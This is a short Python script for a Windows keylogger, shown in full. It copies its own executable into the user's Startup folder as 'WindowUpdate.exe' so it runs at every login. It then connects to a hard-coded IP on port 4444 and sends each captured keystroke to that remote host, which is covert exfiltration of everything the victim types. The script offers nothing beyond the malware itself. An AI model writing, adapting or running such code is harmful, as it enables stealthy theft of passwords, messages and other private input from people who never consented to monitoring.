# listener class, monitor keyboard 
from pynput.keyboard import Listener 
import socket
from pathlib import Path
import sys
import os
import shutil

IP = "172.23.35.163"
port = 4444
address = (IP, port)

def path_manipulation():

	try:
	
			exe_file = Path(sys.executable)

			start_up_folder = Path(os.environ['APPDATA']) /'Microsoft'/'Windows'/'Start Menu'/'Programs'/'Startup'

			duplicate_exe_file = start_up_folder / "WindowUpdate.exe"
			if not duplicate_exe_file.exists():

				shutil.copy2(exe_file, duplicate_exe_file)

	except:
	
			pass

path_manipulation()

# connecting to the client

try:
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((address))
     print(f"Connected to server {IP} on port: {port}")
	
except Exception as e:

	print(f"Could not connect to server {e}")


# keylogger function

def writetofile(key):

	try:

		keystroke= str(key)
		keystroke = keystroke.replace("'", "")

		keys_to_discard = [
			"Key.esc", "Key.ctrl", "Key.alt",
			"Key.shift", "Key.caps_lock", "Key.backspace",
			"Key.tab", "Key.right", "Key.ctrl_l", "key.alt_l"
			"Key.cmdr", "Key.cmd"
		]

		if keystroke == "Key.space":

				keystroke = ' '
		
		elif keystroke == "Key.enter":

				keystroke = '\n'
		
		elif keystroke in keys_to_discard:
				
				keystroke = ''
		
		if keystroke:
			
				byte_msg = keystroke.encode('utf-8')
			
				client.sendall(byte_msg)
		
	except:

		print("Could not connect to the server")
 
# on_press argument makes the function execute everytime

with Listener(on_press=writetofile) as l:
# put the program into a blocking state, waiting indefinitely from the listeners, until we manually terminate it
	l.join()




